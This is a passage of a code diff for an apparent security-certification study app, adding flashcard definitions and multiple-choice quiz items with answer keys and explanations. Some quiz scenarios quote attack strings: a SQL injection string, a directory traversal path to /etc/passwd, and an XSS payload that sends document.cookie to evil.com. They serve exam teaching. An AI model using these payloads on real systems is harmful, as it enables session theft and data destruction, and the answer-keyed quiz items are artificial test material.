+{term:"User Access Review",def:"Periodic audit of all user permissions to remove excess, unused, or inappropriate access",domain:4},
+{term:"PAM",def:"Privileged Access Management — controls, monitors, and audits use of privileged/admin accounts",domain:4},
+{term:"JIT Access",def:"Just-in-Time — temporary elevated access granted only when needed, automatically revoked after",domain:4},
+{term:"EDR",def:"Endpoint Detection and Response — monitors endpoints, detects threats, enables remote response",domain:4},
+{term:"XDR",def:"Extended Detection and Response — extends EDR across network, cloud, email, and identity",domain:4},
+{term:"Application Whitelisting",def:"Only pre-approved applications are allowed to execute — blocks all unknown executables",domain:4},
+{term:"Sandboxing",def:"Running untrusted code in an isolated environment to observe behavior without risk",domain:4},
+{term:"FDE",def:"Full Disk Encryption — encrypts entire storage drive (BitLocker for Windows, FileVault for Mac)",domain:4},
+// Domain 5 — 20 cards
+{term:"Risk Management",def:"Process of identifying, assessing, and responding to risks to protect organizational assets",domain:5},
+{term:"Risk = Likelihood x Impact",def:"Fundamental risk formula — both factors must be considered to prioritize responses",domain:5},
+{term:"Threat",def:"Potential cause of harm — hurricane, hacker, disgruntled employee, natural disaster",domain:5},
+{term:"Vulnerability",def:"Weakness that can be exploited by a threat to cause harm",domain:5},
+{term:"SLE",def:"Single Loss Expectancy = Asset Value × Exposure Factor — financial loss from ONE incident",domain:5},
+{term:"ARO",def:"Annual Rate of Occurrence — expected number of times an incident will occur per year",domain:5},
+{term:"ALE",def:"Annual Loss Expectancy = SLE × ARO — expected yearly financial impact of a risk",domain:5},
+{term:"Risk Avoidance",def:"Eliminate the risky activity entirely — don't collect data you don't need",domain:5},
+{term:"Risk Transference",def:"Shift financial risk to a third party — cyber insurance, outsourcing to SLA-backed vendor",domain:5},
+{term:"Risk Mitigation",def:"Reduce likelihood or impact — patch vulnerabilities, implement MFA, train employees",domain:5},
+{term:"Risk Acceptance",def:"Acknowledge and tolerate the risk — used for low-likelihood, low-impact scenarios",domain:5},
+{term:"NIST CSF",def:"Cybersecurity Framework — Identify, Protect, Detect, Respond, Recover",domain:5},
+{term:"ISO 27001",def:"International standard for establishing an Information Security Management System (ISMS)",domain:5},
+{term:"PCI DSS",def:"Payment Card Industry Data Security Standard — mandatory for organizations handling credit card data",domain:5},
+{term:"HIPAA",def:"US law protecting healthcare patient data — requires safeguards for PHI (Protected Health Information)",domain:5},
+{term:"GDPR",def:"EU regulation giving citizens rights over personal data — access, rectification, erasure, portability",domain:5},
+{term:"Supply Chain Attack",def:"Compromising a trusted vendor, software update, or hardware component to attack downstream targets",domain:5},
+{term:"SLA",def:"Service Level Agreement — contract defining expected uptime, response times, and security obligations",domain:5},
+{term:"NDA",def:"Non-Disclosure Agreement — legal protection for confidential information shared with vendors or partners",domain:5},
+{term:"Right to Audit",def:"Contract clause giving an organization the legal right to audit a vendor's security practices",domain:5},
 ];
 
-const QUIZ = [
-  { q: "Which principle ensures no single person can approve AND deploy a critical change?", opts: ["Least Privilege", "Job Rotation", "Separation of Duties", "Dual Control"], a: 2, d: 1, exp: "Separation of Duties splits critical tasks across multiple people to prevent fraud or abuse." },
-  { q: "Which tool MOST likely detects a user logging in from New York and Tokyo within 30 minutes?", opts: ["Signature-based IDS", "UEBA", "DLP", "WAF"], a: 1, d: 4, exp: "UEBA baselines normal behavior and flags anomalies like impossible travel." },
-  { q: "Which algorithm is symmetric?", opts: ["RSA", "ECC", "Diffie-Hellman", "AES"], a: 3, d: 1, exp: "AES is symmetric — one shared key. RSA, ECC, and Diffie-Hellman are asymmetric." },
-  { q: "An attacker registers 'arnazon.com' to catch users who mistype 'amazon.com'. Which attack is this?", opts: ["Pharming", "Typosquatting", "DNS Poisoning", "Watering Hole"], a: 1, d: 2, exp: "Typosquatting registers deliberately misspelled domain names to catch URL typos." },
-  { q: "Which IR phase comes BEFORE recovery?", opts: ["Preparation", "Detection", "Eradication", "Lessons Learned"], a: 2, d: 4, exp: "Eradication (remove threat) must happen before Recovery (restore systems) to prevent reinfection." },
-  { q: "Which backup type requires a full backup PLUS all subsequent backups to restore?", opts: ["Full", "Differential", "Incremental", "Mirror"], a: 2, d: 3, exp: "Incremental saves changes since the last backup of any type — restore needs the full plus the entire chain." },
-  { q: "A server receives millions of half-open TCP connections and becomes unavailable. Which attack?", opts: ["Smurf Attack", "SYN Flood", "Ping of Death", "DNS Amplification"], a: 1, d: 2, exp: "SYN Flood sends SYN packets but never completes the handshake, exhausting the connection table." },
-  { q: "A public-facing web server belongs in which network zone?", opts: ["Internal LAN", "Secure Zone", "DMZ", "Air-gapped network"], a: 2, d: 3, exp: "DMZ is the buffer zone between internet and internal network — all public-facing servers go here." },
-  { q: "Which BEST describes Perfect Forward Secrecy?", opts: ["Encrypts all sessions with same key", "Unique session keys so past sessions stay secure if key is later compromised", "Uses asymmetric encryption only", "Stores keys in HSM"], a: 1, d: 1, exp: "PFS generates unique session keys per session — past sessions stay safe even if the server key is stolen." },
-  { q: "An employee changes roles but keeps permissions from their old position. Which term is this?", opts: ["Insider Threat", "Separation of Duties violation", "Privilege Creep", "Need-to-Know violation"], a: 2, d: 1, exp: "Privilege creep is accumulation of permissions beyond current role — fixed by periodic access reviews." },
-  { q: "In IaaS cloud, who is responsible for patching the OS?", opts: ["Cloud provider", "Shared equally", "Customer", "Third-party vendor"], a: 2, d: 3, exp: "In IaaS the provider manages hardware — the customer owns and must patch the OS, apps, and data." },
-  { q: "In forensics, what evidence should be collected FIRST?", opts: ["Hard drive image", "Archived logs", "CPU cache and registers", "Swap files"], a: 2, d: 4, exp: "CPU cache and registers are lost immediately on power off — always collect most volatile evidence first." },
-  { q: "Which authentication factor is 'something you are'?", opts: ["Smart card", "PIN", "Fingerprint scan", "Hardware token"], a: 2, d: 1, exp: "Fingerprint is biometric — 'something you are'. Smart card/token = 'something you have'. PIN = 'something you know'." },
-  { q: "Before restoring from backup after ransomware, what must happen FIRST?", opts: ["Notify law enforcement", "Restore critical systems immediately", "Identify and remediate the attack vector", "Run a full vulnerability scan"], a: 2, d: 4, exp: "The attack vector must be closed before restoring — restoring into a vulnerable environment causes immediate reinfection." },
-  { q: "Which protocol uses tickets issued by a Key Distribution Center?", opts: ["RADIUS", "LDAP", "SAML", "Kerberos"], a: 3, d: 1, exp: "Kerberos uses a KDC to issue Ticket Granting Tickets (TGTs) for accessing internal resources." },
-  { q: "An attacker steals a session cookie and immediately takes over while the victim is still logged in. Which attack?", opts: ["Replay Attack", "Pass-the-Hash", "Session Hijacking", "MitM"], a: 2, d: 2, exp: "Session Hijacking takes over an ACTIVE live session. Replay Attack reuses tokens LATER after the session ends." },
-  { q: "Which pen test type gives the tester NO prior knowledge of the environment?", opts: ["White Box", "Gray Box", "Black Box", "Red Team"], a: 2, d: 2, exp: "Black Box = no knowledge, simulates external attacker. Gray Box = partial knowledge. White Box = full knowledge." },
-  { q: "Which control type GUIDES behavior through policy and instruction?", opts: ["Preventive", "Detective", "Corrective", "Directive"], a: 3, d: 1, exp: "Directive controls guide behavior through policies. Preventive controls technically stop attacks automatically." },
-  { q: "Which BEST describes non-repudiation?", opts: ["Encrypts data in transit", "Proves sender cannot deny sending a message", "Verifies identity before access", "Ensures data availability"], a: 1, d: 1, exp: "Non-repudiation means the sender cannot deny sending — provided by digital signatures using the sender's private key." },
-  { q: "Which access control model uses sensitivity labels enforced by the SYSTEM?", opts: ["DAC", "RBAC", "MAC", "ABAC"], a: 2, d: 1, exp: "MAC (Mandatory Access Control) uses labels and clearances enforced by the system — used in military/government." },
-  { q: "An attacker sets up an AP with the same SSID as the corporate Wi-Fi to steal credentials. Which attack?", opts: ["Rogue Access Point", "Deauthentication Attack", "Evil Twin", "Jamming"], a: 2, d: 2, exp: "Evil Twin mimics a legitimate SSID. Rogue AP is an unauthorized AP plugged into the internal network." },
-  { q: "Which risk response involves purchasing cyber insurance?", opts: ["Avoidance", "Mitigation", "Acceptance", "Transference"], a: 3, d: 5, exp: "Risk Transference shifts the financial risk to a third party — cyber insurance is the classic example." },
-  { q: "Which formula calculates Annual Loss Expectancy?", opts: ["ALE = Asset Value × ARO", "ALE = SLE × ARO", "ALE = SLE × Exposure Factor", "ALE = MTBF × MTTR"], a: 1, d: 5, exp: "ALE = SLE × ARO. SLE is the loss per incident, ARO is how many times it occurs per year." },
-  { q: "A developer commits AWS keys to a public GitHub repo. What should happen FIRST?", opts: ["Scan codebase for other credentials", "Remove keys from repo", "Revoke and rotate the compromised keys immediately", "Notify the developer's manager"], a: 2, d: 4, exp: "Bots scan GitHub within seconds. Revoke the keys immediately — containment before cleanup." },
-  { q: "Which protocol separates AAA into three functions and uses TCP?", opts: ["RADIUS", "Kerberos", "TACACS+", "LDAP"], a: 2, d: 1, exp: "TACACS+ separates all three AAA functions and uses TCP. RADIUS combines auth/authorization and uses UDP." },
-  { q: "To ensure cloud data is unreadable even if the provider is compromised, which control is BEST?", opts: ["Provider's default encryption at rest", "TLS for data in transit", "Client-side encryption with customer-managed keys", "CASB to monitor access"], a: 2, d: 3, exp: "Client-side encryption means the customer holds the keys — a compromised provider cannot decrypt what they never held keys for." },
-  { q: "Which attack uses precomputed hash lookup tables to crack passwords?", opts: ["Brute Force", "Rainbow Table", "Dictionary Attack", "Credential Stuffing"], a: 1, d: 2, exp: "Rainbow tables are precomputed hash-to-plaintext tables. Salting passwords defeats this by making each hash unique." },
-  { q: "Which BEST describes a supply chain attack?", opts: ["Exploiting an unpatched server", "Compromising a vendor or software update to attack downstream targets", "Using stolen credentials on internal systems", "Physical theft from a data center"], a: 1, d: 5, exp: "Supply chain attacks compromise a trusted vendor or software update to reach the real target — SolarWinds is the example." },
-  { q: "A company stores customer data. A new employee is given access to ALL systems on day one 'just in case'. Which principle is violated?", opts: ["Separation of Duties", "Dual Control", "Non-repudiation", "Least Privilege"], a: 3, d: 1, exp: "Least Privilege — users should only have the minimum access needed for their specific role, nothing more." },
-  { q: "Which type of malware hides its presence in the OS kernel and causes antivirus to report the system as clean?", opts: ["Trojan", "Spyware", "Rootkit", "Logic Bomb"], a: 2, d: 2, exp: "Rootkits operate at kernel level, intercepting system calls and hiding from security tools — AV reporting clean is the giveaway." },
+// ── 90 QUIZ QUESTIONS ─────────────────────────────────────────────────────────
+const QUIZ=[
+// Domain 1 — 11 questions
+{q:"A company policy states that finance employees cannot both enter AND approve payment transactions. Which security principle does this BEST describe?",opts:["Least Privilege","Dual Control","Separation of Duties","Job Rotation"],a:2,d:1,exp:"Separation of Duties splits a single critical transaction into two steps requiring two different people — preventing any one person from committing fraud alone."},
+{q:"An administrator needs to grant a contractor access to one specific server for exactly 4 hours. Which of the following BEST minimizes risk?",opts:["Create a permanent least-privilege account","Use Just-in-Time (JIT) access with automatic expiration","Add the contractor to an existing RBAC group","Share the admin's credentials temporarily"],a:1,d:1,exp:"JIT access grants temporary, time-bound access that auto-revokes after the task — no lingering accounts or excess permissions."},
+{q:"A user successfully enters their password and then receives a push notification to their phone to approve the login. Which of the following BEST describes what just occurred?",opts:["Single Sign-On","Multi-Factor Authentication","Federated Identity","Biometric Authentication"],a:1,d:1,exp:"MFA combines something you know (password) with something you have (phone notification) — two different factor types."},
+{q:"Which of the following hashing algorithms is MOST resistant to collision attacks and should be used for new implementations?",opts:["MD5","SHA-1","SHA-256","RC4"],a:2,d:1,exp:"SHA-256 is from the SHA-2 family and is currently collision resistant. MD5 and SHA-1 are broken. RC4 is a stream cipher, not a hash."},
+{q:"A developer stores user passwords as SHA-256 hashes in a database. An attacker steals the database and uses a precomputed lookup table to reverse the hashes. Which control would have BEST prevented this?",opts:["Using AES encryption instead","Adding a unique salt to each password before hashing","Using SHA-512 instead of SHA-256","Storing passwords in an HSM"],a:1,d:1,exp:"Salting adds a unique random value to each password before hashing, making every hash unique and rendering precomputed tables useless."},
+{q:"Which of the following access control models would BEST support a government agency requiring that Top Secret data can only be accessed by users with Top Secret clearance?",opts:["DAC","RBAC","ABAC","MAC"],a:3,d:1,exp:"MAC (Mandatory Access Control) uses classification labels and clearances enforced by the SYSTEM — it is the standard for military and government environments."},
+{q:"An organization wants users to log into their corporate portal and then automatically access Salesforce, Office 365, and Workday without re-entering credentials. Which technology BEST enables this?",opts:["MFA","LDAP","SSO with SAML","RADIUS"],a:2,d:1,exp:"SSO with SAML enables users to authenticate once and access multiple applications — SAML is the standard for enterprise federation between different organizations."},
+{q:"A security architect is designing a system requiring that all sensitive database backups cannot be restored without TWO senior administrators simultaneously entering their credentials. Which principle is being applied?",opts:["Separation of Duties","Least Privilege","Dual Control","Need to Know"],a:2,d:1,exp:"Dual Control requires two authorized individuals to be physically present simultaneously — not just separately approving different steps."},
+{q:"Which of the following BEST describes the difference between asymmetric and symmetric encryption?",opts:["Asymmetric uses one key; symmetric uses two keys","Asymmetric uses a public/private key pair; symmetric uses one shared key","Asymmetric is faster; symmetric is slower","Asymmetric is used for bulk data; symmetric for key exchange"],a:1,d:1,exp:"Symmetric = one shared key (fast, bulk data). Asymmetric = public/private pair (slow, key exchange and signatures)."},
+{q:"An attacker obtains a user's valid session token from a network capture and submits it to the web application 12 hours later to gain access. Which attack BEST describes this?",opts:["Session Hijacking","Pass-the-Hash","Replay Attack","Cross-Site Request Forgery"],a:2,d:1,exp:"Replay Attack captures a valid token and retransmits it at a LATER time. Session hijacking takes over a LIVE active session in real time."},
+{q:"Which of the following provides non-repudiation?",opts:["Symmetric encryption with AES-256","Hashing with SHA-256","Digital signature using the sender's private key","TLS 1.3 for data in transit"],a:2,d:1,exp:"A digital signature — hash encrypted with the sender's PRIVATE key — proves authenticity and that the sender cannot deny sending the message."},
+// Domain 2 — 22 questions
+{q:"A targeted email arrives addressed to a CFO by name, referencing her recent board meeting, and asks her to urgently wire funds to a new vendor. Which attack type BEST describes this?",opts:["Phishing","Whaling","Vishing","Pretexting"],a:1,d:2,exp:"Whaling is spear phishing specifically targeting executives (CFO, CEO, board members). The personalized details confirm it is targeted, not generic phishing."},
+{q:"An attacker discovers that entering `'; DROP TABLE users;--` into a login form deletes the entire user database. Which vulnerability is being exploited?",opts:["Cross-Site Scripting","Buffer Overflow","SQL Injection","Directory Traversal"],a:2,d:2,exp:"SQL injection uses malicious SQL syntax in input fields to manipulate the backend database. The ' character breaking out of the SQL string is the primary clue."},
+{q:"A web application reflects user search input directly back onto the page. An attacker crafts a URL containing `<script>document.location='http://evil.com?c='+document.cookie</script>` and emails it to victims. Which attack is this?",opts:["Stored XSS","CSRF","Reflected XSS","SQL Injection"],a:2,d:2,exp:"Reflected XSS — the malicious script is in the URL, reflected back in the server's response, and executed in the victim's browser. It is not stored in the database."},
+{q:"An internal security camera system uses default administrator credentials. An attacker logs in remotely and gains access to live feeds. Which vulnerability type BEST describes this?",opts:["Zero-day vulnerability","Misconfiguration","Buffer overflow","Privilege escalation"],a:1,d:2,exp:"Using default credentials is a classic misconfiguration — the vulnerability is that the system was deployed without changing factory settings."},
+{q:"Security logs show a workstation making outbound connections to 185.210.142.33 on port 443 every 5 minutes, even when no user is logged in. Which threat BEST explains this behavior?",opts:["Ransomware encrypting files","Malware beaconing to a C2 server","A misconfigured scheduled task","SSL certificate renewal traffic"],a:1,d:2,exp:"Regular interval connections to external IPs from an unmanned system is classic C2 beaconing — the malware checks in with its command-and-control server."},
+{q:"An employee notices their computer is extremely slow. Task Manager shows an unknown process 'svchost32.exe' consuming 97% CPU, with network connections to multiple cryptocurrency mining pool addresses. No data appears stolen. Which malware type is this?",opts:["Ransomware","Spyware","Rootkit","Cryptojacker"],a:3,d:2,exp:"Cryptojacking uses the victim's CPU to mine cryptocurrency. The indicators are: extreme CPU usage, no file encryption, and connections to mining pools."},
+{q:"A malware sample installs itself into the Windows kernel, modifies system calls to hide its processes and files, and causes antivirus software to report no threats found. Which malware type BEST describes this?",opts:["Trojan","Worm","Rootkit","Logic Bomb"],a:2,d:2,exp:"Rootkits operate at kernel level, intercepting system calls to hide themselves from the OS and AV tools — AV reporting clean while the system misbehaves is the telltale sign."},
+{q:"An administrator plugs a personal Linksys router into a conference room ethernet port, creating an open wireless network accessible from the parking lot. Which threat does this create?",opts:["Evil Twin","Rogue Access Point","Deauthentication Attack","Bluejacking"],a:1,d:2,exp:"A Rogue AP is an unauthorized wireless device physically connected to the internal network — it creates a backdoor bypassing perimeter security."},
+{q:"Employees near the lobby report being repeatedly disconnected from corporate Wi-Fi, then reconnected to what appears to be the same network but with a different BSSID. An analyst finds a second AP broadcasting 'CorpWiFi' from a vehicle outside. Which attack is occurring?",opts:["Rogue Access Point","Deauthentication Attack","Evil Twin","War Driving"],a:2,d:2,exp:"Evil Twin mimics the legitimate SSID — the deauthentication is being used to push clients off the real AP and onto the fake one to intercept credentials."},
+{q:"A researcher discovers that the input field for a user's middle name on a registration form does not validate length. Entering 5,000 characters crashes the application and exposes internal memory addresses. Which vulnerability is this?",opts:["SQL Injection","Privilege Escalation","Buffer Overflow","Race Condition"],a:2,d:2,exp:"Buffer overflow occurs when input exceeds the allocated buffer size, overwriting adjacent memory — can expose data or enable code execution."},
+{q:"An attacker registers 'micros0ft.com' and builds a convincing Office 365 login page. Employees who mistype the domain enter their credentials. Which attack type is this?",opts:["Pharming","DNS Poisoning","Typosquatting","Watering Hole"],a:2,d:2,exp:"Typosquatting registers deliberately misspelled domain names to catch users who mistype legitimate URLs."},
+{q:"A threat intelligence report describes an attacker who has maintained access to a financial institution for 14 months, exfiltrating small amounts of data weekly without triggering alerts. Which threat actor type BEST describes this?",opts:["Hacktivist","Script Kiddie","Insider Threat","Nation-State APT"],a:3,d:2,exp:"APT indicators: long dwell time, stealthy, slow exfiltration, high sophistication — consistent with nation-state sponsored attackers."},
+{q:"During a network scan, an analyst finds an application accepting requests like: GET /files/../../../etc/passwd. Which vulnerability is being exploited?",opts:["SQL Injection","Directory Traversal","Privilege Escalation","Command Injection"],a:1,d:2,exp:"Directory traversal uses ../ sequences to navigate outside the intended directory — commonly used to read sensitive system files."},
+{q:"An attacker captures the hash of an administrator's Windows password from memory and uses it directly to authenticate to a file server without cracking it. Which attack is this?",opts:["Rainbow Table Attack","Golden Ticket","Pass-the-Hash","Credential Stuffing"],a:2,d:2,exp:"Pass-the-Hash reuses the captured NTLM hash directly for authentication — the actual password never needs to be recovered."},
+{q:"A malicious actor sends ICMP echo requests to a network broadcast address, spoofing the source IP as the victim's address. The victim is then flooded with ICMP replies from hundreds of hosts. Which attack is this?",opts:["SYN Flood","Ping of Death","Smurf Attack","DNS Amplification"],a:2,d:2,exp:"Smurf Attack uses ICMP broadcast amplification — the network acts as a reflector, multiplying the attack traffic directed at the victim."},
+{q:"A penetration tester is given the organization's complete network diagrams, source code for all web applications, domain admin credentials, and full architecture documentation before starting. Which test type is this?",opts:["Black Box","Gray Box","White Box","Red Team"],a:2,d:2,exp:"White Box — the tester has COMPLETE knowledge of the environment. Black = none, Gray = partial, Red Team = adversarial simulation with varying scope."},
+{q:"An attacker gains access to a web server running as a low-privilege user and exploits a vulnerability to gain root/SYSTEM access. Which technique is this?",opts:["Lateral Movement","Credential Stuffing","Privilege Escalation","Pass-the-Hash"],a:2,d:2,exp:"Privilege escalation is gaining higher permissions than originally authorized — moving from a low-privilege process to root/SYSTEM is vertical escalation."},
+{q:"Logs show thousands of login attempts against user accounts using email/password combinations from a recently publicized breach of a different website. Which attack is this?",opts:["Brute Force","Dictionary Attack","Password Spraying","Credential Stuffing"],a:3,d:2,exp:"Credential stuffing uses actual username/password pairs from breached databases — based on the fact that many users reuse credentials across sites."},
+{q:"A threat actor compromises a popular accounting software vendor's update server and embeds malware in a legitimate software update pushed to 18,000 customers. Which attack category BEST describes this?",opts:["Watering Hole","Supply Chain Attack","Fileless Malware","Advanced Persistent Threat"],a:1,d:2,exp:"Supply chain attack — the attacker compromises a trusted vendor or software distribution mechanism to reach downstream targets (mirrors SolarWinds)."},
+{q:"An employee receives a text message claiming to be from IT stating their password expires today and must be reset via a provided link. Which attack type is this?",opts:["Phishing","Vishing","Smishing","Pretexting"],a:2,d:2,exp:"Smishing is SMS-based phishing — using text messages to deliver malicious links or manipulate victims."},
+{q:"A web application allows users to submit comments. An attacker posts a comment containing `<script>alert('XSS')</script>` which executes in the browser of EVERY user who views the comments page. Which attack is this?",opts:["Reflected XSS","SQL Injection","Stored XSS","CSRF"],a:2,d:2,exp:"Stored XSS — the malicious script is saved in the database and executes for every user who loads the page. Reflected XSS only affects the user who clicks the malicious link."},
+{q:"A competitor is gathering information about an organization by reading job postings, LinkedIn profiles, and press releases to understand the company's technology stack. Which technique is this?",opts:["War Driving","Social Engineering","OSINT","Active Reconnaissance"],a:2,d:2,exp:"OSINT (Open Source Intelligence) uses publicly available information — job postings, social media, company websites — to gather intelligence without directly probing systems."},
+// Domain 3 — 19 questions
+{q:"A company migrates its web servers to a cloud provider. The security team assumes the cloud provider will patch the operating systems. Under IaaS, which party is ACTUALLY responsible for OS patching?",opts:["Cloud provider — they own all infrastructure","Shared equally between provider and customer","Customer — they own the OS layer in IaaS","A designated third-party managed service"],a:2,d:3,exp:"In IaaS, the provider manages physical hardware and hypervisor. The customer is responsible for OS, middleware, applications, data, and identity — including all patching."},
+{q:"A security architect needs to ensure that a breach in the Finance VLAN cannot directly reach the HR VLAN without passing through a firewall. Which control BEST achieves this?",opts:["Implement full disk encryption on all workstations","Deploy an IDS on the core switch","Implement network segmentation with inter-VLAN routing through a firewall","Enable 802.1X port authentication"],a:2,d:3,exp:"Network segmentation with a firewall between VLANs forces all inter-VLAN traffic through inspection — preventing direct lateral movement between zones."},
+{q:"An organization's SLA requires that all critical systems be fully operational within 2 hours of a disaster. Which DR term does this define?",opts:["RPO","MTBF","MTD","RTO"],a:3,d:3,exp:"RTO (Recovery Time Objective) defines the maximum acceptable time systems can be down — 2 hours is the RTO. RPO measures acceptable data loss, not downtime."},
+{q:"After restoring from last Sunday's full backup and all 6 incremental backups, an analyst discovers Monday's incremental backup is corrupted and cannot be restored. What data has been permanently lost?",opts:["All data since Sunday's full backup","Only data from Monday","Data from Tuesday onward that depended on Monday's changes","No data — the other incrementals cover it"],a:2,d:3,exp:"Each incremental builds on the previous one. Without Monday's incremental, Tuesday through Saturday's incrementals are also unusable — all data since Monday morning is lost."},
+{q:"A security engineer wants to detect attackers who have already bypassed perimeter security. They deploy fake servers, dummy credentials, and decoy files throughout the internal network. Which technique is this?",opts:["Honeypot","IDS deployment","Threat Hunting","Deception Technology / Honeynet"],a:3,d:3,exp:"A full internal network of decoys — fake servers, credentials, and files — describes a Honeynet or Deception Technology deployment, broader than a single honeypot."},
+{q:"A company stores customer PII in a cloud database using the provider's default encryption. The cloud provider is breached and the provider's encryption keys are stolen. The PII is subsequently decrypted by the attacker. Which control would have BEST prevented this?",opts:["TLS for all API calls","CASB monitoring","Client-side encryption with customer-managed keys","Enabling multi-region replication"],a:2,d:3,exp:"Client-side encryption with customer-managed keys means the provider never has access to the keys — a compromised provider cannot decrypt what they never held keys for."},
+{q:"A web application developer wants to specifically protect against SQL injection, XSS, and CSRF attacks at Layer 7. Which device BEST provides this protection?",opts:["NGFW","IPS","WAF","Proxy Server"],a:2,d:3,exp:"WAF (Web Application Firewall) is specifically designed for Layer 7 HTTP/HTTPS traffic — it understands web application attacks like SQLi, XSS, and CSRF."},
+{q:"A virtual machine on a shared hypervisor exploits a kernel vulnerability to read memory belonging to another VM on the same physical host. Which attack has occurred?",opts:["Container Breakout","Side-Channel Attack","VM Escape","Hypervisor DoS"],a:2,d:3,exp:"VM Escape is when an attacker breaks out of a virtual machine to access the host hypervisor or other VMs running on the same hardware."},
+{q:"An organization performs nightly differential backups and a full backup every Sunday. The system fails on Saturday at 3 PM. How many backup files are needed to restore to Friday's end-of-day state?",opts:["All 6 nightly differentials","Sunday's full backup only","Sunday's full backup + Friday's differential only","Sunday's full backup + all 5 differentials"],a:2,d:3,exp:"Differential backup advantage: only need the last full + the most recent differential. Friday's differential contains all changes since Sunday, so just 2 files needed."},
+{q:"A network engineer is designing a new office. They place the web server, email relay, and public DNS server in a network zone that sits between the internet firewall and the internal LAN firewall. Which zone is this?",opts:["Internal LAN","Secure Zone","DMZ","Extranet"],a:2,d:3,exp:"The DMZ is the buffer zone between two firewalls hosting public-facing services — it limits exposure so a compromised DMZ server cannot directly reach the internal network."},
+{q:"A company wants to passively monitor network traffic for signs of compromise and receive alerts, but does NOT want to risk blocking legitimate traffic. Which device BEST fits this requirement?",opts:["IPS","NGFW","WAF","IDS"],a:3,d:3,exp:"IDS (Intrusion Detection System) is passive — it monitors and alerts but never blocks traffic. IPS would block, which the company specifically wants to avoid."},
+{q:"An organization needs a backup site that can be activated within 4 hours, but the CEO has approved only a medium-sized budget for DR. Which site type BEST fits?",opts:["Hot Site","Warm Site","Cold Site","Mobile Site"],a:1,d:3,exp:"Warm Site balances cost and recovery time — partially equipped, data restored from backup, typically recoverable in hours. Hot site is faster but most expensive."},
+{q:"A security team discovers that a company's VPN clients are configured so only corporate-destined traffic routes through the VPN, while all general internet traffic goes directly through the user's local ISP. Which VPN configuration is this?",opts:["Full Tunnel VPN","Site-to-Site VPN","Split Tunnel VPN","SSL VPN"],a:2,d:3,exp:"Split Tunnel VPN routes only corporate traffic through the encrypted VPN tunnel — internet traffic bypasses the corporate network, reducing bandwidth but limiting visibility."},
+{q:"Which of the following cloud service models gives the CUSTOMER the LEAST security responsibility?",opts:["IaaS","PaaS","SaaS","On-premises"],a:2,d:3,exp:"In SaaS, the provider manages everything from hardware to the application. The customer is only responsible for data and user access management."},
+{q:"An organization wants to ensure its network architecture assumes breach and limits an attacker's ability to move laterally. Every user, device, and service must authenticate regardless of whether they are on-premises or remote. Which architecture BEST describes this?",opts:["Defense in Depth","DMZ Architecture","Zero Trust","Network Access Control"],a:2,d:3,exp:"Zero Trust architecture verifies every access request regardless of network location — explicitly rejects the old perimeter model of trusting internal users by default."},
+{q:"A Type 1 hypervisor has a critical security advantage over a Type 2 hypervisor because:",opts:["Type 1 supports more virtual machines simultaneously","Type 1 runs directly on hardware with no underlying OS to exploit","Type 1 supports hardware encryption natively","Type 1 is cheaper to license and deploy"],a:1,d:3,exp:"Type 1 (bare-metal) runs directly on hardware — there is no host OS that could be compromised to attack the VMs. Type 2 runs on a host OS, adding an attack surface."},
+{q:"An e-commerce company's RTO is 4 hours and RPO is 1 hour. A major outage occurs at 2:00 PM. Which statement is TRUE?",opts:["Systems must be restored by 6:00 PM and can lose up to 4 hours of data","Systems must be restored by 6:00 PM and can lose up to 1 hour of data","Systems must be restored by 3:00 PM and can lose up to 2 hours of data","Both RTO and RPO are measured from the same starting point"],a:1,d:3,exp:"RTO = 4 hours means back online by 6 PM. RPO = 1 hour means the backup used for recovery must be from no earlier than 1:00 PM — maximum 1 hour of data loss."},
+{q:"A CASB solution is MOST useful for which of the following scenarios?",opts:["Blocking SQL injection attacks on a web application","Monitoring and controlling employee use of unsanctioned cloud applications","Encrypting data stored on endpoint hard drives","Detecting malware on corporate laptops"],a:1,d:3,exp:"CASB (Cloud Access Security Broker) specifically monitors, controls, and enforces policy on cloud application usage — including detecting shadow IT and unsanctioned apps."},
+{q:"An organization backs up data every night. On Wednesday morning, the primary system fails. Using differential backups started on Sunday, what is the MINIMUM number of restore operations needed to return to Tuesday night's state?",opts:["One — just Tuesday's differential","Two — Sunday's full + Tuesday's differential","Three — Sunday's full + Monday's + Tuesday's differentials","Seven — full + all six differentials"],a:1,d:3,exp:"Differential backups contain ALL changes since the last full — Sunday's full + Tuesday's differential (which includes Monday AND Tuesday changes) = 2 restores only."},
+// Domain 4 — 25 questions
+{q:"A forensic analyst arrives at a compromised workstation. The system is powered on and running. According to the order of volatility, what should the analyst do FIRST?",opts:["Create a forensic image of the hard drive","Collect and preserve RAM contents","Review the Windows Event Log","Disconnect the system from the network"],a:1,d:4,exp:"RAM is lost the moment the system is powered off — collecting volatile memory (CPU cache then RAM) must happen before anything else, including imaging the hard drive."},
+{q:"During an incident response, the security team has confirmed malware on a server. The NEXT step after containment should be:",opts:["Restore the server from last night's backup","Eradicate the malware and close the vulnerability it used","Conduct a lessons-learned meeting","Notify senior management and legal"],a:1,d:4,exp:"After Containment comes Eradication — remove the malware and close the attack vector. Recovery (restoration) only happens AFTER eradication to prevent immediate reinfection."},
+{q:"An organization wants to automatically respond to confirmed phishing emails by quarantining them, blocking the sender, and creating an incident ticket — all without human intervention. Which technology BEST enables this?",opts:["SIEM","IDS","SOAR","UEBA"],a:2,d:4,exp:"SOAR (Security Orchestration, Automation & Response) automates repetitive security tasks and IR playbooks — SIEM detects and correlates, but SOAR takes automated action."},
+{q:"A SIEM alert fires showing 47 failed logins to the same account followed by one successful login from an IP in a country where the organization has no employees. Which type of attack does this MOST likely indicate?",opts:["Password Spraying","Credential Stuffing","Brute Force Attack","Replay Attack"],a:2,d:4,exp:"Many failed logins followed by one success from an unusual location indicates the attacker had a credential list (stuffing or brute force). The foreign IP suggests credential stuffing."},
+{q:"A security analyst discovers a new admin account was created at 3:17 AM, files were archived to a ZIP, and an outbound transfer of 4.2 GB occurred at 3:22 AM to an external IP. Which phase of the kill chain does this represent?",opts:["Reconnaissance","Exploitation","Actions on Objectives","Lateral Movement"],a:2,d:4,exp:"Creating accounts, staging, and exfiltrating data represents 'Actions on Objectives' — the attacker has already compromised the system and is achieving their goal."},
+{q:"An IR team has successfully removed malware from 12 servers and patched the exploited vulnerability. Before declaring recovery complete, which action should be performed FIRST?",opts:["Archive all incident logs for legal review","Monitor the systems closely for signs of reinfection","Submit a lessons-learned report to management","Begin restoring backed-up data to the servers"],a:1,d:4,exp:"After eradication, the first step in recovery is monitoring restored systems closely — if the root cause was missed, reinfection signs will appear immediately."},
